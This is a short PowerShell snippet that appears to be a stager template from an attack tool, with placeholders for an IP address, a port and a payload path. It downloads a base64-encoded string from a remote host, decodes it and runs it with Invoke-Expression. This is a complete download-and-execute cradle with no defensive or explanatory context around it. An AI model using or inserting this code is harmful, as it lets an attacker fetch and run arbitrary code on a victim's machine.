$wc2 = New-Object system.Net.WebClient;
$enc = $wc2.downloadString("http://{ip}:{port}{b64payload}");
$b = [System.Convert]::FromBase64String($enc)
$b=[System.Text.Encoding]::UTF8.GetString($b)
Invoke-Expression $b
